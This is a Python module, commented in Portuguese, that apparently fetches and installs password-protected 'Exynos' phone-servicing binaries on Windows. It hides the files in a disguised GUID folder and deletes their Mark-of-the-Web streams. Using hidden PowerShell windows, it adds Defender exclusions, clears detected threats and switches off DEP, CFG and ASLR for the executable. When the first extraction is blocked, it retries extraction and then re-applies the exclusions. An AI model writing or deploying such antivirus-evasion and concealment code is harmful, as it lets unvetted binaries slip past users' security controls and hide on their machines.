'''Ref: administrativo/documentacao/2026-08-30_exy_tools_loader.md'''
import ctypes
import logging
import os
import shutil
import sys
import tempfile
from typing import Callable, Optional
_log = logging.getLogger(__name__)
_CLI_EXE = 'ExynosBridgeHost.exe'
_EXY_SUBDIR = '_exy'
_EXY_PREFIX = 'exynos'
_RAMDISKS_SUBDIR = 'ramdisks'
_GUID_DIR = '{33728A63-9212-40F2}'
_TEMP_PREFIX = '_exy_'
_H = 2
_S = 4
_NI = 8192
_fallback_dir: Optional[str] = None
def _cache_base() -> str:
    '''Retorna pasta GUID oculta (mesma do _res_loader.py).'''
    base = os.environ.get('LOCALAPPDATA', os.path.expanduser('~'))
    d = os.path.join(base, _GUID_DIR)
    if not os.path.isdir(d):
        os.makedirs(d, exist_ok=True)
        if sys.platform == 'win32':
            try:
                ctypes.windll.kernel32.SetFileAttributesW(d, _H | _S | _NI)
            except Exception:
                pass
            return d
    return d
def _exy_dir() -> str:
    d = os.path.join(_cache_base(), _EXY_SUBDIR)
    if not os.path.isdir(d):
        os.makedirs(d, exist_ok=True)
    return d
def _set_hidden(path: str):
    if sys.platform == 'win32':
        try:
            ctypes.windll.kernel32.SetFileAttributesW(path, _H | _S | _NI)
            return
        except Exception:
            pass
def _strip_motw(directory: str):
    '''Ref: administrativo/documentacao/2026-08-30_exy_tools_loader.md'''
    if sys.platform != 'win32':
        return
    try:
        _del_file = ctypes.windll.kernel32.DeleteFileW
    except (AttributeError, OSError):
        _del_file = None
    for dirpath, _dirs, filenames in os.walk(directory):
        for fn in filenames:
            if fn.lower().endswith(('.exe', '.dll', '.pyd')):
                full = os.path.join(dirpath, fn)
                ads = full + ':Zone.Identifier'
                if _del_file:
                    _del_file(ads)
                else:
                    try:
                        os.remove(ads)
                    except (OSError, FileNotFoundError):
                        continue
def _engine_root() -> str:
    '''Retorna diretorio real dos binarios.'''
    guid_root = os.path.join(_exy_dir(), _EXY_PREFIX)
    if _fallback_dir:
        fb_root = os.path.join(_fallback_dir, _EXY_PREFIX)
        fb_exe = os.path.join(fb_root, _CLI_EXE)
        if os.path.isfile(fb_exe):
            try:
                with open(fb_exe, 'rb') as f:
                    f.read(2)
            except (PermissionError, OSError):
                return guid_root
            return fb_root
    return guid_root
def _exe_acessivel(path: str) -> bool:
    if not os.path.isfile(path):
        return False
    try:
        with open(path, 'rb') as f:
            f.read(2)
    except (PermissionError, OSError):
        return False
    return True
def cli_disponivel() -> bool:
    '''Ref: administrativo/documentacao/2026-08-30_exy_tools_loader.md'''
    return _exe_acessivel(os.path.join(_engine_root(), _CLI_EXE))
def get_cli_path() -> Optional[str]:
    p = os.path.join(_engine_root(), _CLI_EXE)
    if _exe_acessivel(p):
        return p
def get_engine_dir() -> str:
    return _engine_root()
def get_ramdisks_dir() -> str:
    return os.path.join(_engine_root(), _RAMDISKS_SUBDIR)
def _obter_zip(progress_callback: Optional[Callable[[int, str], None]]=None) -> Optional[str]:
    '''Ref: administrativo/documentacao/2026-08-30_exy_tools_loader.md'''
    try:
        from app.utils._res_loader import obter_ferramenta, consultar_catalogo
        from app.utils._app_cfg import REFS
        arquivo = REFS.EXY_ZIP
    except ImportError:
        _log.warning('_res_loader nao disponivel')
    cat = consultar_catalogo(arquivo)
    sha = cat.get('sha256', '') if cat else ''
    url = cat.get('url', '') if cat else ''
    return obter_ferramenta(arquivo, url_fallback=url, sha256_esperado=sha or None, progress_callback=progress_callback)
def _extrair_zip(zip_path: str, progress_callback: Optional[Callable[[int, str], None]]=None) -> bool:
    '''Ref: administrativo/documentacao/2026-08-30_exy_tools_loader.md'''
    try:
        import pyzipper
    except ImportError:
        _log.error('pyzipper nao instalado')
        return False
    try:
        from app.utils._app_cfg import REFS
        senha = REFS.PK_Z
    except ImportError:
        _log.error('Senha de extracao indisponivel')
        return False
    dest = _exy_dir()
    try:
        with pyzipper.AESZipFile(zip_path, 'r') as zf:
            zf.setpassword(senha)
            membros = zf.namelist()
            total = len(membros)
            for i, membro in enumerate(membros):
                if membro.endswith('/'):
                    os.makedirs(os.path.join(dest, membro), exist_ok=True)
                    continue
                dados = zf.read(membro)
                dest_path = os.path.join(dest, membro)
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                with open(dest_path, 'wb') as f:
                    f.write(dados)
                if not progress_callback:
                    continue
                if not total > 0:
                    continue
                pct = int((i + 1) / total * 100)
                try:
                    try:
                        progress_callback(pct, f'Extraindo ferramentas... ({i + 1}/{total})')
                    except Exception:
                        continue
                finally:
                    pass
                continue
    except Exception as exc:
        _log.error('Erro ao extrair ferramentas: %s', exc)
        return False
    try:
        _strip_motw(dest)
        _set_hidden(dest)
        _log.info('Exynos tools extraidas para %s (%d arquivos)', dest, total)
    except Exception as exc:
        _log.error('Erro ao extrair ferramentas: %s', exc)
        return False
    return True
def _extrair_zip_tempfile(zip_path: str, progress_callback: Optional[Callable[[int, str], None]]=None) -> bool:
    '''Ref: administrativo/documentacao/2026-08-30_exy_tools_loader.md'''
    global _fallback_dir
    try:
        import pyzipper
    except ImportError:
        _log.error('pyzipper nao instalado')
        return False
    try:
        from app.utils._app_cfg import REFS
        senha = REFS.PK_Z
    except ImportError:
        _log.error('Senha de extracao indisponivel')
        return False
    try:
        _fallback_dir = tempfile.mkdtemp(prefix=_TEMP_PREFIX)
        with pyzipper.AESZipFile(zip_path, 'r') as zf:
            zf.setpassword(senha)
            membros = zf.namelist()
            total = len(membros)
            for i, membro in enumerate(membros):
                if membro.endswith('/'):
                    os.makedirs(os.path.join(_fallback_dir, membro), exist_ok=True)
                    continue
                dados = zf.read(membro)
                dest_path = os.path.join(_fallback_dir, membro)
                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                with open(dest_path, 'wb') as f:
                    f.write(dados)
                if not progress_callback:
                    continue
                if not total > 0:
                    continue
                pct = int((i + 1) / total * 100)
                try:
                    try:
                        progress_callback(pct, f'Extraindo (fallback)... ({i + 1}/{total})')
                    except Exception:
                        continue
                finally:
                    pass
                continue
    except Exception as exc:
        _log.error('Fallback tambem falhou: %s', exc)
        if _fallback_dir and os.path.isdir(_fallback_dir):
            shutil.rmtree(_fallback_dir, ignore_errors=True)
        _fallback_dir = None
        return False
    try:
        _strip_motw(_fallback_dir)
        _log.info('Exynos tools (fallback) extraidas para %s', _fallback_dir)
    except Exception as exc:
        _log.error('Fallback tambem falhou: %s', exc)
        if _fallback_dir and os.path.isdir(_fallback_dir):
            shutil.rmtree(_fallback_dir, ignore_errors=True)
        _fallback_dir = None
        return False
    return True
def garantir_tools(progress_callback: Optional[Callable[[int, str], None]]=None) -> bool:
    '''Ref: administrativo/documentacao/2026-08-30_exy_tools_loader.md'''
    if cli_disponivel():
        return True
    if progress_callback:
        try:
            progress_callback(0, 'Verificando ferramentas Exynos...')
        except Exception:
            pass
    preparar_defender()
    zip_path = _obter_zip(progress_callback)
    if not zip_path:
        _log.error('Nao foi possivel obter ferramentas Exynos')
        return False
    ok = _extrair_zip(zip_path, progress_callback)
    if ok and cli_disponivel():
        return True
    _log.warning('CLI bloqueada apos extracao ÔÇö tentando fallback')
    if progress_callback:
        try:
            progress_callback(50, 'Antivirus detectado ÔÇö extraindo em pasta segura...')
        except Exception:
            pass
    _extrair_zip_tempfile(zip_path, progress_callback)
    if cli_disponivel():
        return True
    _log.warning('Fallback tambem bloqueado ÔÇö tentando exclusao Defender + re-extracao')
    if progress_callback:
        try:
            progress_callback(70, 'Solicitando exclusao de antivirus...')
        except Exception:
            pass
    if preparar_defender():
        limpar_cache()
        ok2 = _extrair_zip(zip_path, progress_callback)
        if ok2 and cli_disponivel():
            return True
    _log.error('CLI bloqueada pelo antivirus ÔÇö exclusao manual necessaria')
    return False
_DEFENDER_TIMEOUT_S = 8
def _is_admin() -> bool:
    if sys.platform != 'win32':
        return False
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False
def _run_ps(cmd_str: str, timeout_s: int=_DEFENDER_TIMEOUT_S) -> bool:
    '''Ref: administrativo/documentacao/2026-08-30_exy_tools_loader.md'''
    import subprocess as _sp
    si = _sp.STARTUPINFO()
    si.dwFlags |= _sp.STARTF_USESHOWWINDOW
    si.wShowWindow = _sp.SW_HIDE
    try:
        r = _sp.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', cmd_str], capture_output=True, text=True, timeout=timeout_s, startupinfo=si, creationflags=_sp.CREATE_NO_WINDOW)
        if r.returncode == 0:
            return True
        _log.warning('PS rc=%d stderr_len=%d', r.returncode, len(r.stderr or ''))
        if r.stderr:
            _log.debug('PS stderr: %s', (r.stderr or '')[:300])
        return False
    except _sp.TimeoutExpired:
        _log.warning('PS timeout apos %ds', timeout_s)
        return False
    except FileNotFoundError:
        _log.error('PowerShell nao encontrado')
        return False
    except Exception as exc:
        _log.warning('PS falhou: %s', type(exc).__name__)
        return False
def _defender_ativo() -> bool:
    if sys.platform != 'win32':
        return False
    import subprocess as _sp
    try:
        r = _sp.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', 'Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA SilentlyContinue | ForEach-Object { $e = ($_.productState -band 0x1000) -ne 0 ; Write-Output ("{0}|{1}" -f $_.displayName, $e) }'], capture_output=True, text=True, timeout=5, creationflags=134217728)
        for line in (r.stdout or '').splitlines():
            if '|' not in line:
                continue
            name, enabled = line.rsplit('|', 1)
            if 'windows defender' not in name.lower():
                continue
            if enabled.strip().lower() == 'true':
                return True
    except Exception:
        return False
    try:
        return False
    except Exception:
        return False
def preparar_defender(log_cb=None) -> bool:
    '''Ref: administrativo/documentacao/2026-08-30_exy_tools_loader.md'''
    if sys.platform != 'win32':
        return True
    if not _defender_ativo():
        _log.info('Defender nao ativo ÔÇö preparacao nao necessaria')
        if log_cb:
            log_cb('Defender nao ativo (etapa ignorada)')
        return True
    if not _is_admin():
        _log.warning('Sem privilegios admin ÔÇö exclusoes nao serao aplicadas')
        if log_cb:
            log_cb('Execute como Administrador para aplicar exclusoes')
        return False
    cache = _cache_base()
    falhas = 0
    total = 4
    _log.info('Defender ativo + admin ÔÇö aplicando exclusoes Exynos...')
    if log_cb:
        log_cb('Aplicando exclusoes no antivirus...')
    if not _run_ps(f'Add-MpPreference -ExclusionPath "{cache}" -EA SilentlyContinue'):
        falhas += 1
    if not _run_ps(f'Add-MpPreference -ExclusionProcess "{_CLI_EXE}" -EA SilentlyContinue'):
        falhas += 1
    _run_ps('Remove-MpThreat -EA SilentlyContinue')
    if not _run_ps(f'Set-ProcessMitigation -Name "{_CLI_EXE}" -Disable DEP,SEHOP,ForceRelocateImages,BottomUp,HighEntropy,CFG -EA SilentlyContinue'):
        falhas += 1
    ok = falhas == 0
    if ok:
        _log.info('Exclusoes Defender aplicadas (%d/%d)', total - falhas, total)
        if log_cb:
            log_cb('Exclusao antivirus aplicada com sucesso')
        return ok
    _log.warning('Exclusoes parciais (%d/%d falhas)', falhas, total)
    if log_cb:
        log_cb('Exclusao parcial ÔÇö algumas etapas falharam')
    return ok
def limpar_cache():
    '''Remove binarios extraidos (forcara re-extracao no proximo uso).'''
    global _fallback_dir
    dest = _exy_dir()
    if os.path.isdir(dest):
        shutil.rmtree(dest, ignore_errors=True)
        _log.info('Cache Exynos removido: %s', dest)
    if _fallback_dir:
        if os.path.isdir(_fallback_dir):
            shutil.rmtree(_fallback_dir, ignore_errors=True)
            _log.info('Fallback Exynos removido: %s', _fallback_dir)
            _fallback_dir = None
